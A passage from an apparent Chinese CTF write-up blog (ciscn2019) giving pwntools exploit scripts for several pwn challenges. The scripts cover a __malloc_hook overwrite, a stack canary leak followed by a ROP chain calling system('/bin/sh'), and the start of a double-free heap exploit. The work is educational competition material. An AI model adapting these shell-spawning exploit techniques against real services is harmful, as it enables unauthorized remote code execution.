class="string">&#x27;\n&#x27;</span>),<span class="number">10</span>)-<span class="number">0x3c4b78</span></span><br><span class="line">    log.info(<span class="string">&#x27;libc.address:&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    __malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    one = libc.address+<span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x4f</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x4f</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fight(<span class="number">4</span>)</span><br><span class="line">    fight(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((<span class="number">0xf0</span>-<span class="number">0x60</span>)/<span class="number">2</span>):</span><br><span class="line">        bookdoor(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    z([<span class="string">&#x27;b *&#x27;</span>+<span class="built_in">hex</span>(proc_base+<span class="number">0x129D</span>)])</span><br><span class="line">    create(<span class="number">0x4f</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x4f</span>,<span class="number">1</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x70</span>)+p64(__malloc_hook-<span class="number">0x23</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x60</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x60</span>,<span class="number">0x3</span>*<span class="string">&#x27;\x00&#x27;</span>+p64(one)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fight(<span class="number">2</span>)</span><br><span class="line">    fight(<span class="number">2</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.binary = <span class="string">&#x27;./pwn3&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> io.libs()</span><br><span class="line">        proc_base = io.libs()[<span class="string">&#x27;/ctf/work/CTFPro/2019/ciscn2019-area/PWN/pwn3/pwn3&#x27;</span>]</span><br><span class="line">        log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">        libc_base= io.libs()[<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>]	</span><br><span class="line">        log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">        exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>





<h3 id="pwn4-pwngril-✅"><a href="#pwn4-pwngril-✅" class="headerlink" title="pwn4-pwngril ✅"></a>pwn4-pwngril ✅</h3><p>溢出，通过<code>scanf(&quot;%d&quot;,&amp;a)</code> 输入”+”绕过T，不写入任何值，进而泄露canary，之后ROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">command = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">ru(<span class="string">&quot;do you would to sort your girlfriends?[Y/N/@]&quot;</span>)</span><br><span class="line">se(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;please answer the question1:\n&#x27;</span>)</span><br><span class="line">se(<span class="string">&#x27;^&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;please answer the question2:&#x27;</span>)</span><br><span class="line">se(<span class="string">&#x27;^&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;please input your name:&#x27;</span>)</span><br><span class="line">se(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;how many girlfriends do you have?\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>))</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;this is the sort result:&#x27;</span>)</span><br><span class="line">res = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">num = <span class="built_in">int</span>(rud(<span class="string">&quot;  &quot;</span>),<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> num!=<span class="number">1</span>:</span><br><span class="line">res.append(num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">num1 = <span class="number">0</span></span><br><span class="line">num2 = <span class="number">0</span></span><br><span class="line">num1 = res[<span class="number">0</span>]</span><br><span class="line">num2 = res[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> num1&lt;<span class="number">0</span>:</span><br><span class="line">num1 = num1+<span class="number">0x100000000</span></span><br><span class="line"><span class="keyword">if</span> num2&lt;<span class="number">0</span>:</span><br><span class="line">num2 = num2+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num1)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num2)</span><br><span class="line"></span><br><span class="line">canary =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hex</span>(num1).endswith(<span class="string">&quot;00&quot;</span>):</span><br><span class="line">canary = num1+(num2&lt;&lt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hex</span>(num2).endswith(<span class="string">&quot;00&quot;</span>):</span><br><span class="line">canary = num2+(num1&lt;&lt;<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;you can change your girlfriend\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;which girlfriend do you want to change?&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">27</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(canary&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>((canary&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x400d93</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x400895</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line">libc.address = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>)) -<span class="number">0x6f690</span></span><br><span class="line">log.info(<span class="string">&#x27;libc.address:&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;binsh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;how many girlfriends do you have?\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>))</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;this is the sort result:&#x27;</span>)</span><br><span class="line">res = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">num = <span class="built_in">int</span>(rud(<span class="string">&quot;  &quot;</span>),<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> num!=<span class="number">1</span>:</span><br><span class="line">res.append(num)</span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">num1 = <span class="number">0</span></span><br><span class="line">num2 = <span class="number">0</span></span><br><span class="line">num1 = res[<span class="number">0</span>]</span><br><span class="line">num2 = res[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> num1&lt;<span class="number">0</span>:</span><br><span class="line">num1 = num1+<span class="number">0x100000000</span></span><br><span class="line"><span class="keyword">if</span> num2&lt;<span class="number">0</span>:</span><br><span class="line">num2 = num2+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num1)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num2)</span><br><span class="line"></span><br><span class="line">canary =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hex</span>(num1).endswith(<span class="string">&quot;00&quot;</span>):</span><br><span class="line">canary = num1+(num2&lt;&lt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hex</span>(num2).endswith(<span class="string">&quot;00&quot;</span>):</span><br><span class="line">canary = num2+(num1&lt;&lt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;you can change your girlfriend\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;which girlfriend do you want to change?&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">27</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(canary&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>((canary&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x400d93</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(binsh&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>((binsh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(system&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>((system&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x400895</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">context.binary = <span class="string">&#x27;./pwn4&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">exploit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = process(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="pwn5-magic-heap-✅"><a href="#pwn5-magic-heap-✅" class="headerlink" title="pwn5-magic heap ✅"></a>pwn5-magic heap ✅</h3><p>没有泄露，但是在<code>delete</code>函数中可以造成double free 通过修改topchunk，写入<code>__malloc_hook</code>进而Getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">ru(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Please input the size of story: \n&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(size))</span><br><span class="line">ru(<span class="string">&#x27;please inpute the story: &#x27;</span>)</span><br><span class="line">se(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">ru(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">ru(<span class="string">&#x27;Please input the index:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span 